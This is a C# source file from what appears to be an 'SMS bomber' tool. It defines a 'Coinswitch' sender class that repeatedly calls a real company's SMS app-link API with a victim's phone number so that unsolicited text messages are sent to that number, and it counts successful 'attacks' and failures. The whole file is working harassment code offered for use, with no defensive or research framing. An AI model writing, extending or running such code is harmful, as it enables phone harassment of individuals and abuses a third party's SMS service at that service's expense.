using System.Net.Http;
using System.Threading.Tasks;

namespace SMS_Bomber.Sender
{
    public class Coinswitch : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Coinswitch";
        private readonly HttpClient Attacker = new HttpClient();

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Get,
                $"https://cs-india.coinswitch.co/api/v1/sms/app_link?phone_number={To}");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("\"success\": true")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
